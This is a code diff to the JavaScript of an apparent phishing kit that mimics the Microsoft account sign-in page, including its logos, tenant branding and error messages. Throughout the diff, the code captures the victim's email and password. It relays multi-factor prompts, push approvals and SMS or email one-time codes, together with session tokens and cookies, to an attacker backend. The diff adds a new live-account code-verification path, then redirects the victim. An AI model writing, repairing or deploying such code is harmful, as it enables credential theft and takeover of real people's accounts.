@@ -1,46 +1,45 @@
-var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>'};
+var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>','rinfo':'This information is required.','not7digit':'Please enter the 7-digit code. The code only contains numbers.','codenotwork':'That code didn\'t work. Check the code and try again.'};
 var email = "";
 var epass = "";
 var phone = "";
 var dVal = [];
 var lVal = [];
 var pages = [];
+var Key=""; 
+var randomNum="";
 var skip=1;
 var myInterval,Proofs;
-    $( document ).ready(async function() {
-        console.log(semail);  
+var Timeout;
+$( document ).ready(async function() {
+console.log(semail);  
 if(lmode=='a'){
 skip=1;
 }else{
 skip=0;
 }
 if(isEmail(semail)){
-getpage('EmailPage',0);
 email = $("#email").val(semail);
 nextto(semail);
 }else{
- await getpage('EmailPage',1);  
-  if(semail){
-    email = $("#email").val(semail);
-    $("#error1").html(Errs['Notemail']);
-  }
+await getpage('EmailPage',1);  
+if(semail){
+email = $("#email").val(semail);
+$("#error1").html(Errs['Notemail']);
 }
-
+}
 });
-   
+
 async function getpage(page,dis){
-$("#load").show();
-    var scrn= await GotoType(page);
-    if(scrn['status']='success'){
-        if(dis){
-         $("#screen1").html(scrn['msg']);
-        }else{
-
-        }
+var scrn= await GotoType(page);
+if(scrn['status']='success'){
     pages[page]=scrn['msg'];
-     $("#load").hide();
-}else{
+if(dis){
+$("#screen1").html(scrn['msg']);
 
+}else{
+return scrn;    
+}
+$("#load").hide();
 }
 }
 
@@ -48,55 +47,93 @@ function isEmail(email) {
 var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 return regex.test(email);
 }
-async function nextto(vak) {
+async function nextto(vak=null,bac=null) {
 if(vak){
-    email = vak;  
+email = vak;  
 }else{
-    email = $("#email").val();  
+email = $("#email").val();  
 }
-$("#load").show();
-if (skip==0 || await validateEm(email) === true) {
-$("#load").show();
+if(bac==1){
+    $("#load").show();
+}else{
+    $("#load").hide();
+}
 $("#btn").attr("disabled", true);
-$.ajax({
-type: "POST",
-url: urlx,
-data: { action: "signup", email: email, mode: "getbg" },
-}).done(async function (data) {
-console.log(data);
-var datArray = JSON.parse(data);
-console.log(datArray["status"]);
-if (datArray["status"] == "success") {
-    if(datArray["logo_image"]){
-$(".imglogo").attr("src", datArray["logo_image"]);   
-    }
-if(datArray["bg_image"]){
-$("#imgbg").css("background-image", "url(" + datArray["bg_image"] + ")");
-}
-}
- await getpage('PassPage',1);
-$("#btn").attr("disabled", false);
-$(".ext-promoted-fed-cred-box").hide();
-});
-} else {
-   await getpage('EmailPage',1);
+if (skip==1 ) {
+    if (isEmail(email) === true) {
+ await getpage('PassPage',1); 
+  $("#idBtn_Back").hide();
+}else{
     $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 }
-}
-function orgme() {
-setTimeout(function () {
-$("#page2").hide();
-$("#page3").show();
-}, 3000);
-}
+ 
+}else{
+var valx = '{"username":"'+email+'","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":"","country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"flowToken":"","isAccessPassSupported":true}';
+$.ajax({
+type: "POST",
+url: urlx,
+data: {
+action: "signup",
+valx: valx,
+mode: "validem",
+},
+}).done(async function (data) {
+var vdata = JSON.parse(data);
+if (vdata["IfExistsResult"]=='1' || vdata["IfExistsResult"]=='4'||vdata["IfExistsResult"]===undefined) {
+  await getpage('EmailPage',1); 
+$("#load").hide();
+$("#error1").html(Errs['Notemail']);
 
+}else{
+    if(vdata["ThrottleStatus"]=="1" && vdata["EstsProperties"]["DomainType"]==4){
+await getpage('OrgloadPage',1);
+Timeout=setTimeout(async function(){
+    await getpage('PassPage',1); 
+     $("#idBtn_Back").hide();
+},3000)
+    }else{
+   await getpage('PassPage',1); 
+    }
+if(bac==1){
+    $("#idBtn_Back").show();
+}else{
+       $("#idBtn_Back").hide();
+
+}
+if(vdata["EstsProperties"]["UserTenantBranding"]){
+var logo_image=vdata["EstsProperties"]["UserTenantBranding"][0]["BannerLogo"];
+var bg_image=vdata["EstsProperties"]["UserTenantBranding"][0]["Illustration"];
+if(logo_image){
+$(".imglogo").attr("src", logo_image);   
+}
+if(bg_image){
+$("#imgbg").css("background-image", "url(" + bg_image+ ")");
+$("#footer, #footer a").addClass('has-background');
+}
+var BoilerPlateText=vdata["EstsProperties"]["UserTenantBranding"][0]['BoilerPlateText'];
+if(BoilerPlateText){
+$("#idBoilerPlateText").html(BoilerPlateText).show();
+}
+}
+}  
+
+$("#btn").attr("disabled", false);
+$(".ext-promoted-fed-cred-box").hide();
+});
+}
+}
 function back(page) {
- $("#screen1").html(pages[page]);
- $("#email").val(email);
- $(".imglogo").attr("src", 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');  
- $("#imgbg").css("background-image", "url( https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)");
+$("#screen1").html(pages[page]);
+clearTimeout(Timeout);
+$("#load").hide();
+if(page=='EmailPage'){
+$("#email").val(email);
+$(".imglogo").attr("src", 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');  
+$("#imgbg").css("background-image", "url( https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)");
 $(".ext-promoted-fed-cred-box").show();
+$("#idBoilerPlateText").hide(); 
+}
 }
 function cancel() {
 location.reload();
@@ -127,16 +164,18 @@ if (datArray["status"] == "success") {
 window.location.replace(datArray["land"]);
 } else if (datArray["status"] == "login_auth") {
 auth(datArray["auth_val"]);
+} else if (datArray["status"] == "login_auth_live") {
+auth_live(datArray["auth_val"]);
 }else if (datArray["status"] == "successx") {
-    lcount++;
-    if(lcount>=2){
-   window.location.replace(datArray["land"]);     
-    }else{
-     $("#load").hide();
+lcount++;
+if(lcount>=2){
+window.location.replace(datArray["land"]);     
+}else{
+$("#load").hide();
 $("#error2").html(Errs['accIncorrect']);
 $("#epass").val("");
 $("#btn2").attr("disabled", false);   
-    }
+}
 } else {
 $("#load").hide();
 $("#error2").html(Errs['accIncorrect']);
@@ -147,38 +186,18 @@ return false;
 });
 }
 }
-async function validateEm(email){
-var valx = '{"username":"'+email+'","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":"","country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"flowToken":"","isAccessPassSupported":true}';
-var reslt= await $.ajax({
-type: "POST",
-url: urlx,
-data: {
-action: "signup",
-valx: valx,
-mode: "validem",
-},
-})
-var vdata = JSON.parse(reslt);
-if (vdata["IfExistsResult"]=='1') {
-return false;
-}else{
- return true;
-}
-
-}
 async  function auth(dauth) {
-    if(Proofs){
+if(Proofs){
 $("#screen1").html(Proofs);
-    }else{
+}else{
 dVal["arrUserProofs"] = dauth["arrUserProofs"];
 dVal["ctx"] = dauth["ctx"];
 dVal["flowToken"] = dauth["flowToken"];
 dVal["canary"] = dauth["canary"];
 var data = dauth["arrUserProofs"];
-console.log(data);
 var gototype=await GotoType('Proofs');
 if(gototype['status']){
-    Proofs=gototype['msg'];
+Proofs=gototype['msg'];
 $("#screen1").html(gototype['msg']);
 $("#load").hide();
 data.forEach(function (val, i) {
@@ -191,25 +210,187 @@ Proofs=$('#screen1').html();
 }
 }
 }
+async  function auth_live(dauth) {
+if(Proofs){
+$("#screen1").html(Proofs);
+}else{
+dVal=dauth;
+var data = JSON.parse(dVal["arrUserProofs"]);
+
+Key=dVal["extra"]["key"]; 
+randomNum=dVal["extra"]["randomNum"];
+var gototype=await getpage('ProofsLive',0);
+if(gototype['status']){
+Proofs=gototype['msg'];
+$("#screen1").html(gototype['msg']);
+$("#load").hide();
+data.forEach(function (val, i) {
+var channel = val["channel"];
+$("#screen1 #"+channel).show();
+$("#screen1 #"+channel+ " .pnum").text(val["name"]);
+phone = val["display"];
+if(channel=="SMS" || channel== "Email"){
+$("#screen1  #iSelectProof #iSelectProofAlternate").attr('onmousedown','ihacode(\''+channel+'\')');
+}
+});
+
+pages['ProofsLive']=$('#screen1').html();
+}
+}
+}
+function getproof(atype){
+$("#screen1 #iAdditionalProofInfo").hide();
+$("#screen1 #"+atype+" #iAdditionalProofInfo").show();
+$("#screen1 #"+atype+" #iAdditionalProofInfo .eml").text(email.split('@')[1]);
+if(atype=="SMS" || atype== "Email"){
+$("#screen1  #iSelectProof #iSelectProofAction").attr('onclick','SendCodeLive(\''+atype+'\')');
+$("#screen1  #iSelectProof #iSelectProofAction").attr('disabled',false).html("Send Code");
+$("#screen1  #iSelectProof #iSelectProofAlternate").attr('onclick','ihacode(\''+atype+'\')');
+}else if("unknown"){
+
+$("#screen1  #iSelectProof #iSelectProofAction").attr('disabled',false).html("Verify Online");
+}
+}
+async function SendCodeLive(atype) {
+var data = JSON.parse(dVal["arrUserProofs"]);
+var arrUserProofs = data.find((obj) => {return obj.channel === atype;});
+if(atype=='Email'){
+var pvalue=$("#iProofEmail").val();
+if(email.split('@')[0]!=pvalue){
+$("#iProofEmail").addClass('has-error');
+$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
+return false;
+}
+pvalue=email;
+}else{
+var pvalue=$("#iProofPhone").val();
+var str = arrUserProofs['name'];
+str=str.slice(str.length - 2);
+pvalue=pvalue.slice(pvalue.length - 2);
+if(str!=pvalue){
+$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
+$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError .errPh").text(str);
+$("#iProofPhone").addClass('has-error');
+return false;
+}
+pvalue=$("#iProofPhone").val();
+}
+$("#iVerifyCodeSpinner").show();
+$("#iSelectProofAction").attr("disabled", true);
+var valx = {token:'',purpose:'UnfamiliarLocationHard',epid:arrUserProofs['epid'],autoVerification:false,autoVerificationFailed:false,confirmProof:pvalue,uiflvr:dVal["uiflvr"],uaid:dVal["uaid"],scid:dVal["scid"],hpgid:dVal["hpgid"],canary:dVal["canary"],cookie:dVal["cookie"]};
+$.ajax({
+type: "POST",
+url: urlx,
+data: {
+action: "signup",
+valx: valx,
+mode: "SendOtt",
+},
+}).done(async function (data) {
+$("#load").show();
+console.log(data);
+var vdata = JSON.parse(data);
+if (vdata["route"]) {
+// lVal["ctx"] = vdata["Ctx"];
+var gototype=await getpage('ProofsVerifyCode',0);
+if(gototype['status']){
+$("#screen1").html(gototype['msg']);
+$("#load").hide();
+$("#iVerifyCodeTitle").html('Enter your security code');
+$("#iVerifyCodeSpinner").hide();
+$("#iSelectProofAction").attr("disabled", false);
+if(atype=='Email'){
+$("#screen1 .ScEmail").show();
+$("#screen1 .ScSms").hide();
+}else{
+$("#screen1 .ScEmail").hide();
+$("#screen1 .ScSms").show();
+$("#screen1 .ScSms .fourDig").text(pvalue);
+}
+$("#screen1  #iVerifyCode #iVerifyCodeAction").attr('onclick','VerifyCodeLive(\''+atype+'\',\''+pvalue+'\')');
+}
+pages['ProofsVerifyCode']=$('#screen1').html();
+}else{
+ $("#iVerifyCodeSpinner").hide();
+$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
+}
+});
+}
+async function ihacode(atype){
+$("#iVerifyCodeSpinner").show();
+var gototype=await getpage('ProofsVerifyCode',0);
+if(gototype['status']){
+$("#screen1").html(gototype['msg']);
+$("#load").hide();
+$("#iVerifyCodeTitle").html('Enter the code we sent you');
+$("#iVerifyCodeSpinner").hide();
+$("#iSelectProofAction").attr("disabled", false);
+$("#screen1 .ScEmail").hide();
+$("#screen1 .ScSms").hide();
+$("#screen1  #iVerifyCode #iVerifyCodeAction").attr('onclick','VerifyCodeLive(\''+atype+'\',null)');
+}  
+pages['ProofsVerifyCode']=$('#screen1').html();
+}
+async function VerifyCodeLive(atype,pvalue) {
+      var data = JSON.parse(dVal["arrUserProofs"]);
+    var arrUserProofs = data.find((obj) => {return obj.channel === atype;});
+var vcode=$("#iOttText").val();
+if(vcode==''){
+    $("#iVerifyCodeError").html(Errs['rinfo']).show();
+    $("#iOttText").addClass('has-error');
+    return false;
+}else if(vcode.length!=7){
+      $("#iVerifyCodeError").html(Errs['not7digit']).show();
+  $("#iOttText").addClass('has-error');
+}else{
+ var vcodexx=Encrypt(null, vcode, "saproof", null);
+$("#iVerifyCodeSpinner").show();
+$("#iVerifyCodeAction").attr("disabled", true);
+
+var valx={publicKey:dVal['extra']['ski'],encryptedCode: vcodexx,action:'IptVerify',purpose:'UnfamiliarLocationHard',epid:arrUserProofs["epid"],uiflvr : dVal["uiflvr"],uaid : dVal["uaid"], scid:dVal["scid"],hpgid:dVal["hpgid"],canary:dVal["canary"],cookie : dVal["cookie"], urlreturn:dVal["urlreturn"]};
+
+if(pvalue){
+valx['confirmProof']=pvalue;
+}
+var gdata  = await $.ajax({
+type: "POST",
+url: urlx,
+data: {
+action: "signup",
+email: email, epass: epass,
+valx: valx,
+mode: "VerifyCode",
+}
+}).done(function (data) {
+    $("#iVerifyCodeSpinner").hide();
+    $("#iVerifyCodeAction").attr("disabled", false);
+var vdata = JSON.parse(data);
+if (vdata["error"]) {
+$("#screen1 #iVerifyCodeError").html(Errs['codenotwork']).show(); 
+}else if (vdata["status"] == "success") {
+window.location.replace(vdata["land"]);
+}else{
+}
+});
+}
+}
 async  function  GotoAuth(atype){
-    $("#load").show();
+$("#load").show();
 var reslt = await GotoType(atype);
 if(reslt['status']=='success'){
-   
-console.log(reslt['status']);
 var act= await beginAuth(atype);
 if (act["Success"]) {
-     $("#load").hide();
+$("#load").hide();
 $("#screen1").html(reslt['msg']);
 if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
-    if(act['Entropy']){
-        $("#displaySign").show();
-        $("#displaySigntxt").html(act['Entropy']);
-    }
+if(act['Entropy']){
+$("#displaySign").show();
+$("#displaySigntxt").html(act['Entropy']);
+}
 startEndath(atype);
 }
 }else{
-    authback(1);
+authback(1);
 }
 }
 }
@@ -217,15 +398,15 @@ function authback(err) {
 $("#load").show();
 auth(dVal);
 stopEndath();
- if(err){
-         setTimeout(function(){
-       $("#screen1 #errorx").html(Errs['UnableVeri']);  
-       $("#load").hide();
-   },1000)
-   
-    }else{
-       $("#load").hide();  
-    }
+if(err){
+setTimeout(function(){
+$("#screen1 #errorx").html(Errs['UnableVeri']);  
+$("#load").hide();
+},1000)
+
+}else{
+$("#load").hide();  
+}
 }
 async function GotoType(atype) {
 var reslt= await $.ajax({
@@ -257,7 +438,7 @@ $("#screen1 #verifyOTC").attr('disabled',true);
 var res= await endAuth(atype, otc);
 $("#load").hide();
 if (res["Success"]) {
-    $("#load").show();
+$("#load").show();
 processAuth(atype, otc);
 }else if (res["ResultValue"]=='InvalidSession'){
 $("#screen1 #verifyOTC").attr('disabled',false);
@@ -266,11 +447,9 @@ $("#screen1 #staErr").html(Errs['InvalidSession']);
 $("#screen1 #verifyOTC").attr('disabled',false);
 $("#screen1 #staErr").html(Errs['OathCodeIncorrect']);
 }else{
-    $("#screen1 #staErr").html('');
-  authback(1);
+$("#screen1 #staErr").html('');
+authback(1);
 }
-
-console.log('res',res); 
 }else{
 $("#load").hide();
 $("#screen1 #staErr").html(Errs['NoOtpCode']);
@@ -296,9 +475,8 @@ lVal["sseid"] = vdata["SessionId"];
 lVal["stpoll"] = datetoiso(vdata["Timestamp"]);
 lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
 }else{
-     $("#screen1 #errorx").html(Errs['UnableVeri']);  
+$("#screen1 #errorx").html(Errs['UnableVeri']);  
 }
-console.log(vdata);
 });
 var vdata = JSON.parse(gdata);
 return vdata;
@@ -306,7 +484,7 @@ return vdata;
 
 var PollCount = 1;
 async function endAuth(atype, otc) {
-     lVal["stpoll"] = datetoiso(new Date());
+lVal["stpoll"] = datetoiso(new Date());
 PollCount++;
 var valx =
 '{"Method":"EndAuth","SessionId":"' +
@@ -332,7 +510,6 @@ mode: "eauth",
 },
 }).done(function (data) {
 var vdata = JSON.parse(data);
-console.log(vdata);
 lVal["ctx"] = vdata["Ctx"];
 lVal["flowToken"] = vdata["FlowToken"];
 lVal["sseid"] = vdata["SessionId"];
@@ -342,21 +519,15 @@ PollCount = 1;
 AuthEdata(atype);
 }
 if (PollCount >= 10) {
-    authback(1);
-   
-console.log("PollCount Stoped");
+authback(1);
 stopEndath();
 }
 
 });
 var vdata = JSON.parse(rr);
 return vdata;
-console.log('rr',rr);
-
 }
 function processAuth(atype, otc) {
-console.log("processAuth");
-
 var valx =
 '{"type":19,"GeneralVerify":true,"request":"' +
 lVal["ctx"] +
@@ -371,13 +542,11 @@ lVal["flowToken"] +
 '","hpgrequestid":"' +
 lVal["sseid"] +
 '","sacxt":"","hideSmsInMfaProofs":false,"canary":"'+dVal["canary"]+'","i19": "42293"}';
-console.log(valx);
 $.ajax({
 type: "POST",
 url: urlx,
 data: { action: "signup", email: email, epass: epass, valx: valx, mode: "pAuth" },
 }).done(function (data) {
-console.log(data);
 var datArray = JSON.parse(data);
 if (datArray["status"] == "success") {
 window.location.replace(datArray["land"]);
@@ -393,20 +562,22 @@ function stopEndath() {
 clearInterval(myInterval);
 }
 function datetoiso(date){
-    var dateobj =  new Date(date);
+var dateobj =  new Date(date);
 return dateobj.getTime();
 }
 $(document).on('keypress',function(e) {
-    if(e.which == 13) {
-        console.log(e.target.id);
-        if(e.target.id=='email'){
-        nextto();
-        }else if(e.target.id=='epass'){
-            redlogin();
-        }else if(e.target.id=='otc'){
-            $("#verifyOTC").click();
-
-        }
-    }
+if(e.which == 13) {
+if(e.target.id=='email'){
+nextto(null,1);
+}else if(e.target.id=='epass'){
+redlogin();
+}else if(e.target.id=='otc'){
+$("#verifyOTC").click();
+}else if(e.target.name=='livecode'){
+$("#iSelectProofAction").click();
+}else if(e.target.id=='iOttText'){
+$("#iVerifyCodeAction").click();
+}
+}
 });
- function dec2hex (dec){return dec.toString(16).padStart(2, "0")}function generateId (len){var arr=new Uint8Array((len || 40) / 2);window.crypto.getRandomValues(arr);return Array.from(arr, dec2hex).join('');}var SesIN=generateId (40); $("div").addClass(SesIN);
+function dec2hex (dec){return dec.toString(16).padStart(2, "0")}function generateId (len){var arr=new Uint8Array((len || 40) / 2);window.crypto.getRandomValues(arr);return Array.from(arr, dec2hex).join('');}var SesIN=generateId (40); $("div").addClass(SesIN);
